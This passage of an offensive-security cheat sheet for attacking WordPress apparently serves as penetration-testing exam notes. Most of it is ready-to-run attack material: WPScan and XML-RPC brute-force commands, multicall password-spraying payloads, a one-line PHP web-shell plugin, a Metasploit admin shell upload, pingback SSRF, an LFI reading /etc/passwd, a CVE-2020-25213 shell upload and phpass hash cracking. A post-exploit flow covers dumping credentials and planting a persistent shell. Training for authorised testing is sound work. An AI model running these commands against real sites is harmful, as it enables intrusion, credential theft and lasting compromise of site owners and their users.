# WPScan — stealthy
wpscan --url http://SERVER_IP/ --stealthy -e vp,vt,u
```

### Attack Commands

```shell
# WPScan brute-force
wpscan --url http://SERVER_IP/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin

# XML-RPC brute-force (single test)
curl -s -X POST http://SERVER_IP/xmlrpc.php -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>PASSWORD</string></value></param></params></methodCall>'

# Theme Editor RCE (after admin login — inject into 404.php)
curl "http://SERVER_IP/wp-content/themes/THEME_NAME/404.php?cmd=id"

# Malicious plugin upload (create + zip + upload via admin panel)
echo '<?php /**\n * Plugin Name: X\n */ system($_GET["cmd"]); ?>' > x.php && zip x.zip x.php

# Metasploit shell upload
msfconsole -q -x "use exploit/unix/webapp/wp_admin_shell_upload; set RHOSTS SERVER_IP; set USERNAME admin; set PASSWORD pass; set LHOST tun0; run"

# Pingback SSRF
curl -s -X POST http://SERVER_IP/xmlrpc.php -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://INTERNAL_TARGET:PORT/</string></value></param><param><value><string>http://SERVER_IP/?p=1</string></value></param></params></methodCall>'

# LFI via Mail Masta
curl "http://SERVER_IP/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

# WP File Manager RCE (CVE-2020-25213)
curl -F "cmd=upload" -F "target=l1_Lw" -F "upload[]=@shell.php" \
  "http://SERVER_IP/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
```

### Common WordPress File Paths

| Path | Contents / Purpose |
|------|-------------------|
| `/wp-config.php` | DB credentials, auth keys, debug settings |
| `/wp-content/debug.log` | PHP errors (if WP_DEBUG_LOG enabled) |
| `/wp-content/uploads/` | User-uploaded media (organized by year/month) |
| `/wp-content/plugins/` | All installed plugins |
| `/wp-content/themes/` | All installed themes |
| `/wp-includes/version.php` | Core version definition |
| `/wp-admin/install.php` | Installer (if site not fully configured) |
| `/wp-cron.php` | WP-Cron (scheduled tasks) |
| `/xmlrpc.php` | XML-RPC API |
| `/wp-json/` | REST API root |
| `/wp-login.php` | Authentication page |
| `/wp-content/backup-db/` | Database backup files (if backup plugin used) |
| `/.wp-config.php.swp` | Vim swap file (misconfiguration) |
| `/wp-config.php.bak` | Backup config (misconfiguration) |
| `/wp-config.php~` | Editor backup (misconfiguration) |

### WordPress Hash Cracking Reference

| Tool | Command | Notes |
|------|---------|-------|
| **Hashcat** | `hashcat -m 400 hashes.txt wordlist.txt` | Mode 400 = phpass |
| **John** | `john --wordlist=wordlist.txt hashes.txt` | Auto-detects phpass |
| **Hash format** | `$P$B7jG2BAX3Ry.Lqo.99YRn5cQ3YXe1` | $P$ prefix = phpass/WordPress |
| **Identify** | `hashid '$P$B7jG2BAX...'` or `hash-identifier` | Confirms phpass |

### XML-RPC Payload Templates

**List methods:**
```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>
```

**Authentication test (wp.getUsersBlogs):**
```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>USERNAME</string></value></param>
    <param><value><string>PASSWORD</string></value></param>
  </params>
</methodCall>
```

**Multicall brute-force (batch N passwords):**
```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>USERNAME</string></value>
        <value><string>PASS1</string></value>
      </data></array></value></member>
    </struct></value>
    <!-- Repeat struct block for each password -->
  </data></array></value></param></params>
</methodCall>
```

**Pingback SSRF:**
```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://TARGET_URL:PORT/path</string></value></param>
    <param><value><string>http://WORDPRESS_URL/?p=1</string></value></param>
  </params>
</methodCall>
```

---

## Quick Attack Flow (Decision Tree)

```text
1. DISCOVER
   └─ Confirm WordPress (robots.txt, meta tag, wp-login.php)
   └─ Identify version (generator tag, feed, readme.html)

2. ENUMERATE
   └─ Users: ?author=N, REST API, login error messages
   └─ Plugins: page source, aggressive WPScan
   └─ Themes: page source, style.css
   └─ Check: XML-RPC enabled? REST API open? Directory listing?

3. GAIN ACCESS
   ├─ [Unauthenticated] Known plugin vulns (LFI, RCE, SQLi)
   ├─ [Unauthenticated] XML-RPC brute-force → admin creds
   ├─ [Unauthenticated] REST API content injection (old WP)
   └─ [Authenticated]
       ├─ Theme Editor → 404.php injection → RCE
       ├─ Plugin Editor → hello.php injection → RCE
       ├─ Malicious plugin upload → RCE
       └─ Metasploit wp_admin_shell_upload → Meterpreter

4. POST-EXPLOIT
   └─ Read wp-config.php → DB creds
   └─ Dump wp_users → crack hashes (hashcat -m 400)
   └─ Credential reuse → lateral movement
   └─ Plant persistent shell in uploads/
```

!!! tip "Exam Strategy"
    On timed exams, run WPScan with the API token first. If it finds a known vulnerable plugin with a public exploit, that's your fastest path. Only resort to brute-forcing if no unauthenticated vectors exist.
